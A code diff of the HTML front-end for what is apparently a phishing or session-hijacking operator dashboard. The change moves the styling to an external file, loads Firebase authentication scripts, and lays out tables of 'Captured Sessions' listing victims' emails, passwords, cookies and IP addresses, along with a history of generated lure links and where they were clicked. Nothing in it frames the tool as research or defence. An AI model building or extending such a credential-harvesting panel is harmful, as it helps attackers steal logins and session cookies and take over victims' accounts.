@@ -4,83 +4,45 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dashboard</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-        }
-        .sidebar {
-            width: 200px;
-            background: #333;
-            color: white;
-            padding: 20px;
-            height: 100vh;
-        }
-        .sidebar button {
-            display: block;
-            width: 100%;
-            margin-bottom: 10px;
-            padding: 10px;
-            background: #007bff;
-            border: none;
-            cursor: pointer;
-        }
-        .sidebar button:hover {
-            background: #0056b3;
-        }
-        .content {
-            padding: 20px;
-            width: 100%;
-        }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-        }
-        table, th, td {
-            border: 1px solid black;
-        }
-        th, td {
-            padding: 10px;
-            text-align: center;
-        }
-    </style>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
+    <script src="firebase-config.js"></script>
+    <script src="script.js"></script>
 </head>
 <body>
+    <div class="sidebar">
+        <button onclick="generateLink()" class="menu generate-link">Generate Link</button>
+        <button onclick="viewCapturedSessions()" class="menu captured-sessions">Captured Sessions</button>
+        <button onclick="viewGeneratedLinks()" class="menu generated-links">Generated Links</button>
+        <button onclick="logout()" class="menu logout">Logout</button>
+    </div>
 
-<div class="sidebar">
-    <h3>Menu</h3>
-    <button onclick="generateLink()">Generate Link</button>
-    <button onclick="viewCapturedSessions()">Captured Sessions</button>
-    <button onclick="viewCookies()">Cookies</button>
-    <button onclick="logout()">Logout</button>
-</div>
+    <div class="content">
+        <h3>Captured Sessions</h3>
+        <table border="1">
+            <thead>
+                <tr>
+                    <th>Email</th>
+                    <th>Password</th>
+                    <th>Cookies</th>
+                    <th>IP</th>
+                </tr>
+            </thead>
+            <tbody id="capturedSessions"></tbody>
+        </table>
 
-<div class="content">
-    <h2>Dashboard</h2>
-    <h3>Captured Sessions</h3>
-    <table>
-        <tr>
-            <th>Email</th>
-            <th>Password</th>
-            <th>Cookies</th>
-            <th>IP</th>
-        </tr>
-        <tbody id="capturedSessions"></tbody>
-    </table>
-
-    <h3>Generated Links</h3>
-    <table>
-        <tr>
-            <th>Link</th>
-            <th>Clicked Location</th>
-            <th>IP</th>
-        </tr>
-        <tbody id="generatedLinks"></tbody>
-    </table>
-</div>
-
-<script src="script.js"></script>
-
+        <h3>Generated Links History</h3>
+        <table border="1">
+            <thead>
+                <tr>
+                    <th>URL</th>
+                    <th>Clicked Location</th>
+                    <th>IP Address</th>
+                </tr>
+            </thead>
+            <tbody id="generatedLinks"></tbody>
+        </table>
+    </div>
 </body>
 </html>
